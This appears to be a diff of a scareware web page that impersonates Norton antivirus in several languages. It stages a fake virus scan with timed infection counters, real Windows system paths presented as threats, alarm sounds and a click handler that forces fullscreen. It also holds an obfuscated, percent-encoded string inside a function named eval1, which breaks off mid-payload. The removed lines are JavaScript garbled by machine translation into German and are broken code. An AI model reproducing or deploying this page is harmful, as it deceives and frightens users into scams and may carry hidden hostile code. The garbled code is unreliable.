 
-document.getElementById("menu").innerHTML = "Produkte & Services Norton-Blog Support Kostenlose Testversion";
 
-document.getElementById("menu_b").innerHTML = "Japan | Nutzungsbedingungen | Lizenzvereinbarung | Datenschutzrichtlinie | Karriere | Cookies | Sitemap | Systemstatus";
 
-document.getElementById("head1").innerHTML = "Cyber-Bedrohungen entwickeln sich weiter. Auch Norton-Produkte entwickeln sich weiter.";
+    if (lang == "tr") {
 
-document.getElementById("head2").innerHTML =
+        document.getElementById("menu").innerHTML = "ÜRÜNLER VE HİZMETLER &nbsp&nbsp&nbsp DESTEK &nbsp&nbsp&nbsp ÜCRETSİZ DENEME";
 
-"Norton 360 ist da. Sichern Sie Ihre Geräte mit umfassendem Schutz, einschließlich Virenschutz, VPN und Passwortverwaltung, alles in einer Lösung.“;
+        document.getElementById("menu_b").innerHTML = "Yasal Bildirim | Lisans Sözleşmesi | Gizlilik İlkesi | Kariyer | Tanımlama Bilgileri | Site Haritası | Sistem Durumu";
 
-}
+        document.getElementById("head1").innerHTML = "Siber tehditler gelişti. Koruma çözümlerimiz de öyle.";
 
-if (lang == "ru") {
+        document.getElementById("head2").innerHTML = "Norton 360. Antivirüs, parola yöneticisi, PC Cloud Backup‡‡, 4 ve daha fazlasını içeren cihaz güvenliği ile kapsamlı koruma. Hepsi tek bir çözümde.";
 
-document.getElementById("menu").innerHTML = "ПРОДУКТЫ И УСЛУГИ ПРОБНЫЕ ВЕРСИИ";
+    }
 
-document.getElementById("menu_b").innerHTML = "Lizenzierte Informationen | Lizenzierte Lizenz | Politische Vertraulichkeit | Urlaub | Cookie-Dateien | Karte |
+    if (lang == "ja") {
 
-document.getElementById("head1").innerHTML = "Die Datei wird angezeigt. Das ist nicht der Fall.";
+        document.getElementById("menu").innerHTML = "製品とサービス &nbsp&nbsp&nbsp ノートン ブログ &nbsp&nbsp&nbsp サポート &nbsp&nbsp&nbsp 無料体験版";
 
-document.getElementById("head2").innerHTML =
+        document.getElementById("menu_b").innerHTML = "日本 | 利用規約 | 使用許諾契約 | プライバシーポリシー | 採用情報 | クッキー | サイトマップ | システムの状態";
 
-„Norton 360. Programme, Passwort-Manager, Passwort-Manager, 4 und mehr. Weitere gute Lösungen.“;
+        document.getElementById("head1").innerHTML = "進化するサイバー脅威。ノートン製品も進化。";
 
-}
+        document.getElementById("head2").innerHTML =
+
+            "ノートン 360 がリリースされました。ウイルス対策機能、VPN、パスワード管理機能など、包括的な保護機能によってデバイスセキュリティを確保することができます。すべての機能が 1 つのソリューションに導入されています。";
+
+    }
+
+    if (lang == "ru") {
+
+        document.getElementById("menu").innerHTML = "ПРОДУКТЫ И УСЛУГИ &nbsp&nbsp&nbsp ПОДДЕРЖКА &nbsp&nbsp&nbsp БЕСПЛАТНЫЕ ПРОБНЫЕ ВЕРСИИ";
+
+        document.getElementById("menu_b").innerHTML = "Юридическая информация | Лицензионное соглашение | Политика конфиденциальности | Вакансии | Файлы cookie | Карта сайта | Состояние системы";
+
+        document.getElementById("head1").innerHTML = "Киберугрозы развиваются. Наша защита тоже.";
+
+        document.getElementById("head2").innerHTML =
+
+            "Norton 360. Комплексная защита устройств, в которую входят антивирусные программы, Password Manager, резервное копирование в облаке для ПК‡‡, 4 и многое другое. Все в одном решении.";
+
+    }
 
 </script>
 
 <script language="JavaScript" type="text/javascript">
 
-setTimeout(function () {
+    setTimeout(function () {
 
-document.getElementById("win2").style.display = "block";
+        document.getElementById("win2").style.display = "block";
 
-}, 2000);
+    }, 2000);
 
-setTimeout(function () {
+    setTimeout(function () {
 
-document.getElementById("cnt1").innerHTML = "143";
+        document.getElementById("cnt1").innerHTML = "143";
 
-}, 2600);
+    }, 2600);
 
-setTimeout(function () { document.getElementById("Pfad1").innerHTML = "C:\Windows\System32\csrss.exe";
+    setTimeout(function () {
 
-}, 3000);
+        document.getElementById("path1").innerHTML = "C:\Windows\System32\csrss.exe";
 
-setTimeout(function () {
+    }, 3000);
 
-document.getElementById("Pfad1").innerHTML = "C:\Windows\System32\sihost.exe";
+    setTimeout(function () {
 
-}, 3700);
+        document.getElementById("path1").innerHTML = "C:\Windows\System32\sihost.exe";
 
-setTimeout(function () {
+    }, 3700);
 
-document.getElementById("cnt1").innerHTML = "218";
+    setTimeout(function () {
 
-}, 4000);
+        document.getElementById("cnt1").innerHTML = "218";
 
-setTimeout(function () {
+    }, 4000);
 
-document.getElementById("Pfad1").innerHTML = "C:\Programme\Windows Defender\MSASCuiL.exe";
+    setTimeout(function () {
 
-}, 4600);
+        document.getElementById("path1").innerHTML = "C:\Program Files\Windows Defender\MSASCuiL.exe";
 
-setTimeout(function () {
+    }, 4600);
 
-document.getElementById("cnt1").innerHTML = "398"; document.getElementById("cnt2").style.color = "#dd0000";
+    setTimeout(function () {
 
-document.getElementById("cnt2").innerHTML = "1";
+        document.getElementById("cnt1").innerHTML = "398";
 
-document.getElementById("cnt4").style.color = "#dd0000";
+        document.getElementById("cnt2").style.color = "#dd0000";
 
-document.getElementById("cnt4").innerHTML = "1";
+        document.getElementById("cnt2").innerHTML = "1";
 
-document.getElementById("win2_line_red").style.display = "block";
+        document.getElementById("cnt4").style.color = "#dd0000";
 
-document.getElementById("beep").play();
+        document.getElementById("cnt4").innerHTML = "1";
 
-}, 5000);
+        document.getElementById("win2_line_red").style.display = "block";
 
-setTimeout(function () {
+        document.getElementById("beep").play();
 
-document.getElementById("vir1").style.bottom = "235px";
+    }, 5000);
 
-}, 5100);
+    setTimeout(function () {
 
-setTimeout(function () {
+        document.getElementById("vir1").style.bottom = "235px";
 
-document.getElementById("path2").innerHTML = "C:\Windows\System32\SgrmBroker.exe";
+    }, 5100);
 
-}, 5200);
+    setTimeout(function () {
 
-setTimeout(function () {
+        document.getElementById("path2").innerHTML = "C:\Windows\System32\SgrmBroker.exe";
 
-document.getElementById("path2").innerHTML = "SEMgrSvc";
+    }, 5200);
 
-}, 5800);
+    setTimeout(function () {
 
-setTimeout(function () {
+        document.getElementById("path2").innerHTML = "SEMgrSvc";
 
-document.getElementById("cnt1").innerHTML = "538";
+    }, 5800);
 
-}, 6000);
+    setTimeout(function () {
 
-setTimeout(function () {
+        document.getElementById("cnt1").innerHTML = "538";
 
-document.getElementById("path2").innerHTML = "NcaSvc";
+    }, 6000);
 
-}, 6700);
+    setTimeout(function () {
 
-setTimeout(function () {
+        document.getElementById("path2").innerHTML = "NcaSvc";
 
-document.getElementById("cnt1").innerHTML = "791";
+    }, 6700);
 
-document.getElementById("cnt2").innerHTML = "2";
+    setTimeout(function () {
 
-document.getElementById("cnt4").innerHTML = "2";
+        document.getElementById("cnt1").innerHTML = "791";
 
-}, 7000);
+        document.getElementById("cnt2").innerHTML = "2";
 
-setTimeout(function () {
+        document.getElementById("cnt4").innerHTML = "2";
 
-document.getElementById("vir1").style.bottom = "440px";
+    }, 7000);
 
-document.getElementById("vir1").style.opacity = "0";
+    setTimeout(function () {
 
-document.getElementById("vir2").style.bottom = "235px";
+        document.getElementById("vir1").style.bottom = "440px";
 
-document.getElementById("beep").play();
+        document.getElementById("vir1").style.opacity = "0";
 
-}, 7100);
+        document.getElementById("vir2").style.bottom = "235px";
 
-setTimeout(function () {
+        document.getElementById("beep").play();
 
-document.getElementById("Pfad2").innerHTML = "C:\Windows\System32\DDFs";
+    }, 7100);
 
-}, 7500);
+    setTimeout(function () {
 
-setTimeout(function () {
+        document.getElementById("path2").innerHTML = "C:\Windows\System32\DDFs";
 
-document.getElementById("cnt1").innerHTML = "1021"; document.getElementById("cnt2").innerHTML = "3";
+    }, 7500);
 
-document.getElementById("cnt4").innerHTML = "3";
+    setTimeout(function () {
 
-}, 8000);
+        document.getElementById("cnt1").innerHTML = "1021";
 
-setTimeout(function () {
+        document.getElementById("cnt2").innerHTML = "3";
 
-document.getElementById("vir2").style.bottom = "440px";
+        document.getElementById("cnt4").innerHTML = "3";
 
-document.getElementById("vir2").style.opacity = "0";
+    }, 8000);
 
-document.getElementById("vir3").style.bottom = "235px";
+    setTimeout(function () {
 
-document.getElementById("beep").play();
+        document.getElementById("vir2").style.bottom = "440px";
 
-}, 8100);
+        document.getElementById("vir2").style.opacity = "0";
 
-setTimeout(function () {
+        document.getElementById("vir3").style.bottom = "235px";
 
-document.getElementById("path2").innerHTML = "C:\Windows\System32\Recovery";
+        document.getElementById("beep").play();
 
-}, 8300);
+    }, 8100);
 
-setTimeout(function () {document.getElementById("cnt1").innerHTML = "1273";
+    setTimeout(function () {
 
-}, 9000);
+        document.getElementById("path2").innerHTML = "C:\Windows\System32\Recovery";
 
-setTimeout(function
-n () {
+    }, 8300);
 
-document.getElementById("Pfad2").innerHTML = "C:\Windows\System32\DriverState";
+    setTimeout(function () {
 
-}, 9200);
+        document.getElementById("cnt1").innerHTML = "1273";
 
-setTimeout(function () {
+    }, 9000);
 
-document.getElementById("Pfad2").innerHTML = "tempRoot\system32\DRIVERS\bowser.sys";
+    setTimeout(function () {
 
-}, 9700);
+        document.getElementById("path2").innerHTML = "C:\Windows\System32\DriverState";
 
-setTimeout(function () {
+    }, 9200);
 
-document.getElementById("cnt1").innerHTML = "1589";
+    setTimeout(function () {
 
-document.getElementById("cnt2").innerHTML = "4";
+        document.getElementById("path2").innerHTML = "tempRoot\system32\DRIVERS\bowser.sys";
 
-document.getElementById("cnt4").innerHTML = "4";
+    }, 9700);
 
-}, 10000);
+    setTimeout(function () {
 
-setTimeout(function () {
+        document.getElementById("cnt1").innerHTML = "1589";
 
-document.getElementById("vir3").style.bottom = "440px";
+        document.getElementById("cnt2").innerHTML = "4";
 
-document.getElementById("vir3").style.opacity = "0";
+        document.getElementById("cnt4").innerHTML = "4";
 
-document.getElementById("vir4").style.bottom = "235px";
+    }, 10000);
 
-document.getElementById("beep").play();
+    setTimeout(function () {
 
-}, 10100);
+        document.getElementById("vir3").style.bottom = "440px";
 
-setTimeout(function () {
+        document.getElementById("vir3").style.opacity = "0";
 
-document.getElementById("path2").innerHTML = "C:\Windows\System32\WinBioDatabase";
+        document.getElementById("vir4").style.bottom = "235px";
 
-}, 10500);
+        document.getElementById("beep").play();
 
-setTimeout(function () {
+    }, 10100);
 
-document.getElementById("cnt1").innerHTML = "1723";
+    setTimeout(function () {
 
-}, 11000);
+        document.getElementById("path2").innerHTML = "C:\Windows\System32\WinBioDatabase";
 
-setTimeout(function () {
+    }, 10500);
 
-document.getElementById("path2").innerHTML = "vmickvpexchange";
+    setTimeout(function () {
 
-}, 11600);
+        document.getElementById("cnt1").innerHTML = "1723";
 
-setTimeout(function () {
+    }, 11000);
 
-document.getElementById("cnt1").innerHTML = "1916";
+    setTimeout(function () {
 
-}, 12000);
+        document.getElementById("path2").innerHTML = "vmickvpexchange";
 
-setTimeout(function () {
+    }, 11600);
 
-document.getElementById("path2").innerHTML = "HidBtn";
+    setTimeout(function () {
 
-}, 12300);
+        document.getElementById("cnt1").innerHTML = "1916";
 
-setTimeout(function () {
+    }, 12000);
 
-document.getElementById("cnt1").innerHTML = "2038";
+    setTimeout(function () {
 
-document.getElementById("cnt2").innerHTML = "80";
+        document.getElementById("path2").innerHTML = "HidBtn";
 
-document.getElementById("cnt4").innerHTML = "80";
+    }, 12300);
 
-}, 13000);
+    setTimeout(function () {
 
-setTimeout(function () {
+        document.getElementById("cnt1").innerHTML = "2038";
 
-document.getElementById("vir4").style.bottom = "440px";
+        document.getElementById("cnt2").innerHTML = "80";
 
-document.getElementById("vir4").style.opacity = "0";
+        document.getElementById("cnt4").innerHTML = "80";
 
-document.getElementById("vir5").style.bottom = "235px";
+    }, 13000);
 
-document.getElementById("beep").play();
+    setTimeout(function () {
 
-}, 13100);
+        document.getElementById("vir4").style.bottom = "440px";
 
-setTimeout(function () {
+        document.getElementById("vir4").style.opacity = "0";
 
-document.getElementById("Pfad2").innerHTML = "WdNisDrv";
+        document.getElementById("vir5").style.bottom = "235px";
 
-}, 13200);
+        document.getElementById("beep").play();
 
-setTimeout(function () {
+    }, 13100);
 
-document.getElementById("Pfad2").innerHTML = "rdbss";
+    setTimeout(function () {
 
-}, 13900);
+        document.getElementById("path2").innerHTML = "WdNisDrv";
 
-setTimeout(function () {
+    }, 13200);
 
-document.getElementById("Pfad2").innerHTML = "C:\Windows\System32\dot3svc.dll";
+    setTimeout(function () {
 
-}, 14700);
+        document.getElementById("path2").innerHTML = "rdbss";
 
-setTimeout(function () {
+    }, 13900);
 
-document.getElementById("Pfad2").innerHTML = "UASPStor";
+    setTimeout(function () {
 
-}, 15500);
+        document.getElementById("path2").innerHTML = "C:\Windows\System32\dot3svc.dll";
 
-setTimeout(function () { 
+    }, 14700);
 
-document.getElementById("cnt1").innerHTML = "2038"; 
+    setTimeout(function () {
 
-document.getElementById("vir5").style.opacity = "0"; 
+        document.getElementById("path2").innerHTML = "UASPStor";
 
-document.getElementById("w2_4").innerHTML = "Fertig"; 
+    }, 15500);
 
-if (lang == "pt") document.getElementById("w2_4").innerHTML = "Terminado"; 
+    setTimeout(function () {
 
-if (lang == "es") document.getElementById("w2_4").innerHTML = "Listo"; 
+        document.getElementById("cnt1").innerHTML = "2038";
 
-if (lang == "fr") document.getElementById("w2_4").innerHTML = "Effekt"; 
+        document.getElementById("vir5").style.opacity = "0";
 
-if (lang == "it") document.getElementById("w2_4").innerHTML = "Fatto"; 
+        document.getElementById("w2_4").innerHTML = "Done";
 
-document.getElementById("w2_5").innerHTML = "";
+        if (lang == "pt") document.getElementById("w2_4").innerHTML = "Terminado";
 
-document.getElementById("Pfad2").innerHTML = "";
+        if (lang == "es") document.getElementById("w2_4").innerHTML = "Listo";
 
-document.getElementById("win3").style.display = "keine";
+        if (lang == "fr") document.getElementById("w2_4").innerHTML = "Effectué";
 
-document.getElementById("link_black").href = "#";
+        if (lang == "it") document.getElementById("w2_4").innerHTML = "Fatto";
 
-}, 16000);
+        document.getElementById("w2_5").innerHTML = "";
 
-Funktion showmess() {
+        document.getElementById("path2").innerHTML = "";
 
-document.getElementById("mess").style.display = "block";
+        document.getElementById("win3").style.display = "none";
 
-}
+        document.getElementById("link_black").href = "#";
+
+    }, 16000);
+
+
+
+    function showmess() {
+
+        document.getElementById("mess").style.display = "block";
+
+    }
 
 </script>
 
 <script type="text/javascript">
 
-/*$(document).ready(function(){
+    /*$(document).ready(function(){
 
-$("#open_popup").click(function(){
+  $("#open_popup").click(function(){
 
 $(".chrome-alert").show();
 
@@ -2029,371 +2104,432 @@ $(".chrome-alert").show();
 
 <script type="text/javascript">
 
-addEventListener("click", function () {
+    addEventListener("click", function () {
 
-var
+        var
 
-el = document.documentElement
+            el = document.documentElement
 
-, rfs =
+            , rfs =
 
-el.requestFullScreen
+            el.requestFullScreen
 
-|| el.webkitRequestFullScreen
+            || el.webkitRequestFullScreen
 
-|| el.mozRequestFullScreen
+            || el.mozRequestFullScreen
 
-;
+        ;
 
-rfs.call(el);
+        rfs.call(el);
 
-});
-
-</script>
-
-<script type="text/javascript">
-
-setTimeout(function () {
-
-document.getElementById("map").style.display = "block";
-
-document.getElementById("warning").play();
-
-}, 10);
+    });
 
 </script>
 
 <script type="text/javascript">
 
-/*=============HELPER=================*/
+    setTimeout(function () {
 
-var Helper = (function () {
+        document.getElementById("map").style.display = "block";
 
-var data = [];
+        document.getElementById("warning").play();
 
-var months = ['Januar', 'Februar', 'März', 'April', 'Mai', 'Juni', 'Juli', 'August', 'September', 'Oktober', 'November', 'Dezember'];
-
-var days = ['Sonntag', 'Montag', 'Dienstag', 'Mittwoch', 'Donnerstag', 'Freitag', 'Samstag'];
-
-function setDays(d) {
-
-if ((d.constructor !== Array) || d.length !== 7)
-
-return false;
-
-Tage = t;
-
-}
-
-Funktion setzeMonate(m) {
-
-wenn ((m.Konstruktor !== Array) || m.Länge !== 12)
-
-return false;
-
-Monate = m;
-
-}
-
-Funktion getDate() {
-
-var jetzt = neues Datum();
-
-var Monat = Typ von (Monate[jetzt.getMonat()]) == 'undefined' ? jetzt.getMonat() : Monate[jetzt.getMonat()];
-
-return (jetzt.getDate()) + " " + Monat + " " + jetzt.getGanzesJahr();
-
-}
-
-Funktion getMonat() {
-
-var jetzt = neues Datum();
-
-var Monat = Typ
-von (Monate[jetzt.getMonth()]) == 'undefiniert' ? jetzt.getMonth() : Monate[jetzt.getMonth()];
-
-Monat zurückgeben;
-
-}
-
-Funktion getDay() {
-
-var jetzt = neues Datum();
-
-var Tag = Typ von (Tage[jetzt.getDay()]) == 'undefiniert' ? jetzt.getDay() : Tage[jetzt.getDay()];
-
-Tag zurückgeben;
-
-}
-
-Funktion getDayOfMonth() {
-
-var jetzt = neues Datum();
-
-var Tag = ('0' + jetzt.getDate()).slice(-2);
-
-Tag zurückgeben;
-
-}
-
-Funktion getUrlParameter(Name) {
-
-name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
-
-var regex = neuer RegExp('[\\?&]' + Name + '=([^&#]*)');
-
-var Ergebnisse = regex.exec(location.search);
-
-Rückgabe Ergebnisse === null ? '' : decodeURIComponent(Ergebnisse[1].replace(/\+/g, ' '));
-
-}
-
-Funktion findAncestor(Element, Name) {
-
-während ((Element = Element.Elternelement) && !Element.Klassenliste.enthält(Name));
-
-Rückgabe Element;
-
-}
-
-Funktion bindOnQuery(Abfrage, Rückruf, Aktion = 'Klick') {
-
-var Elemente = document.querySelectorAll(Abfrage);
-
-für (var i = 0; i < Elemente.Länge; i++) {
-
-Elemente[i].addEventListener(Aktion, Rückruf, false);
-
-}
-
-}
-
-Funktion bindOnId(Name, Rückruf, Aktion = 'Klick') {
-
-var Element = document.getElementById(Name);
-
-element.addEventListener(Aktion, Rückruf, false);
-
-}
-
-Funktion replaceMarkers(Text, Marker) {
-
-für (Schlüssel in Markern) {
-
-var Suche = '%' + Schlüssel + '%';
-
-Text = Text.replace(neuer RegExp(Suche, 'g'), Marker[Schlüssel]);
-
-}
-
-Rückgabetext;
-
-}
-
-return {
-
-setDays: setDays,
-
-setMonths: setMonths,
-
-getDate: getDate,
-
-getDay: getDay,
-
-getMonth: getMonth,
-
-getDayOfMonth: getDayOfMonth,
-
-getUrlParameter: getUrlParameter,
-
-findAncestor: findAncestor,
-
-bindOnQuery: bindOnQuery,
-
-bindOnId: bindOnId,
-
-replaceMarkers: replaceMarkers
-
-};
-
-})();
+    }, 10);
 
 </script>
+
+<script type="text/javascript">
+
+    /*=============HELPER================*/
+
+    var Helper = (function () {
+
+
+
+        var data = [];
+
+
+
+        var months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
+
+        var days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
+
+
+
+        function setDays(d) {
+
+            if ((d.constructor !== Array) || d.length !== 7)
+
+                return false;
+
+
+
+            days = d;
+
+        }
+
+
+
+        function setMonths(m) {
+
+            if ((m.constructor !== Array) || m.length !== 12)
+
+                return false;
+
+
+
+            months = m;
+
+        }
+
+
+
+        function getDate() {
+
+            var now = new Date();
+
+            var month = typeof (months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+
+            return (now.getDate()) + " " + month + " " + now.getFullYear();
+
+        }
+
+
+
+        function getMonth() {
+
+            var now = new Date();
+
+            var month = typeof (months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+
+            return month;
+
+        }
+
+
+
+        function getDay() {
+
+            var now = new Date();
+
+            var day = typeof (days[now.getDay()]) == 'undefined' ? now.getDay() : days[now.getDay()];
+
+            return day;
+
+        }
+
+
+
+        function getDayOfMonth() {
+
+            var now = new Date();
+
+            var day = ('0' + now.getDate()).slice(-2);
+
+            return day;
+
+        }
+
+
+
+        function getUrlParameter(name) {
+
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+
+            var results = regex.exec(location.search);
+
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+
+        }
+
+
+
+        function findAncestor(element, name) {
+
+            while ((element = element.parentElement) && !element.classList.contains(name)) ;
+
+            return element;
+
+        }
+
+
+
+        function bindOnQuery(query, callback, action = 'click') {
+
+            var elements = document.querySelectorAll(query);
+
+            for (var i = 0; i < elements.length; i++) {
+
+                elements[i].addEventListener(action, callback, false);
+
+            }
+
+        }
+
+
+
+        function bindOnId(name, callback, action = 'click') {
+
+            var element = document.getElementById(name);
+
+            element.addEventListener(action, callback, false);
+
+        }
+
+
+
+        function replaceMarkers(text, markers) {
+
+            for (key in markers) {
+
+                var search = '%' + key + '%';
+
+                text = text.replace(new RegExp(search, 'g'), markers[key]);
+
+            }
+
+
+
+            return text;
+
+        }
+
+
+
+        return {
+
+            setDays: setDays,
+
+            setMonths: setMonths,
+
+            getDate: getDate,
+
+            getDay: getDay,
+
+            getMonth: getMonth,
+
+            getDayOfMonth: getDayOfMonth,
+
+            getUrlParameter: getUrlParameter,
+
+            findAncestor: findAncestor,
+
+            bindOnQuery: bindOnQuery,
+
+            bindOnId: bindOnId,
+
+            replaceMarkers: replaceMarkers
+
+        };
+
+
+
+    })();
+
+</script>
+
+
+
+
 
 <script type="text/javascript">function eval1() {
 
-var s1 = unescape("o%7Ewl%7Drxw.%3B9n%7Fju%3B.%3BA.%3BB.@K%7Fj%7B.%3B9%7C%3A.%3CM%7Ewn%7Cljyn .%3BA.%3B%3By.%3B%3E@O%81v.%3B%3E@N%7C%82%818.%3B%3E%3CL.%3B%3E%3CJx.%3B%3EA9t%7Fx8. %3B%3E%3CLK8.%3B%3E%3CLL8JU.%3B%3EA9t.%3B%3E@L8.%3B%3E%3CL.%3B%3E%3CJ.%3B%3E@M.%3B%3 E%3CK8.%3B%3E%3CMW.%3B%3E@O%81x.%3B%3E@Mvt%83x8.%3B%3E%3CLK8.%3B%3E%3CL.%3B%3E%3CL.% 3B%3E@K8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ.%3B%3EA%3C%818.%3B%3E%3CL.%3B%3E%3COJY.%3 B%3E@N.%3B%3EA%3D.%3B%3EA%3C.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3 CL.%3B%3E%3CO.%3B%3E%3CMU.%3B%3EA%3C.%3B%3EA%3D%81.%3B%3EA%3D.%3B%3EA%3C8.%3B%3E%3CL .%3B%3E%3COJY%838.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CM8.%3B%3E%3CL.%3B%3E%3COJY.%3B%3EA %3B%83.%3B%3EA%3C8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3 CO.%3B%3E%3CMWV.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWW.%3B%3E%3CJU%608.%3B%3 E%3CL.%3B%3E%3COJW%838.%3B%3E%3CL.%3B%3E%3COJY8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ8.% 3B%3E%3CL.%3B%3E%3COJW.%3B%3EA%3C.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B %3E%3CL.%3B%3E%3CO.%3B%3E%3CMU%838.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CK%83.%3B%3EA%3C8. %3B%3E%3CL.%3B%3E%3COJYL%81%7F.%3B%3EA%3C%81%83.%3B%3EA%3A%608.%3B%3E%3CL.%3B%3E%3CO K.%3B%3E%3CJ%80%80.%3B%3EA%3A%83.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B% 3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV8.%3B%3E% 3CL.%3B%3E%3CO.%3B%3E%3CMU.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWa%838.%3B%3E %3CL.%3B%3E%3COK.%3B%3E%3CK%83.%3B%3EA%3C8.%3B%3E%3CL.%3B%3E%3COJYL8.%3B%3E%3CL.%3B% 3E%3COJW%838.%3B%3E%3CL.%3B%3E%3COJY8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ8.%3B%3E%3CL. %3B%3E%3COJW.%3B%3EA%3Ct%7F.%3B%3EA%3A8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ%83.%3B%3E% 3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CM W8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV.%3B%3E%3CJ8. %3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWa.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3 B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV.%3B%3E%3CJUb.%3B% 3E@K8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ.%3B%3EA%3C%818.%3B%3E%3CL.%3B%3E%3COJY.%3B%3 E@N.%3B%3EA%3D.%3B%3EA%3C.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL. %3B%3E%3CO.%3B%3E%3CMU.%3B%3EA%3C.%3B%3EA%3D8.%3B%3E%3CL.%3B%3E%3COJW.%3B%3E@N.%3B%3 E@L.%3B%3E@M8.%3B%3E%3CL.%3B%3E%3COJY%81.%3B%3EA%3A.%3B%3E@N%81.%3B%3EA9.%3B%3E%3CJ8 .%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWV%7F.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW W.%3B%3E%3CJU%60.%3B%3E@N.%3B%3E@K.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWV8.% 3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CL.%3B%3E@N.%3B%3EA%3C%82.%3B%3EA%3D8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CLLc8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CK%83.%3B%3EA%3C8.%3B%3E%3CL.%3B%
-3E%3COJY.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWW.%3B%3E%3CJU%60.%3B%3E@ N.%3B%3E@K.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWV8.%3B%3E%3CL.%3B%3E%3 CO.%3B%3E%3CMW.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb%7FL8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CL.%3B%3E@M .%3B%3E@N%81.%3B%3E@M.%3B%3E%3CJUa.%3B%3E%3CJUa8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E% 3CMX.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.%3B%3E%3CL.%3B %3E%3CO.%3B%3E%3CMXb%7FL8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CL.%3B%3E@M.%3B%3E@N% 81.%3B%3E@M.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWW8.%3B%3E%3CL.%3B%3E%3 COJW%838.%3B%3E%3CL.%3B%3E%3COJY8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ8.%3B%3E%3C L.%3B%3E%3COJW.%3B%3EA%3C.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3 E%3CL.%3B%3E%3CO.%3B%3E%3CMV8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV.%3B%3E%3CJUb%8 3.%3B%3EA%3A8.%3B%3E%3CL.%3B%3E%3COJX%83.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B %3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMU.%3B%3E@N.%3B%3E@K.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW.%3B%3E%3CJ8. %3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3C MXb%838.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CK%83.%3B%3EA%3C8.%3B%3E%3CL.%3B%3E%3COJ YL%808.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3COJY8.%3B%3E%3CL. %3B%3E%3COJY.%3B%3EA%3D.%3B%3EA%3C.%3B%3E%3CJUa.%3B%3E%3CJUa8.%3B%3E%3CL.%3B%3 E%3CO.%3B%3E%3CMX.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.% 3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb%838.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CK%83.%3B %3EA%3C8.%3B%3E%3CL.%3B%3E%3COJYL%808.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ8.%3B%3 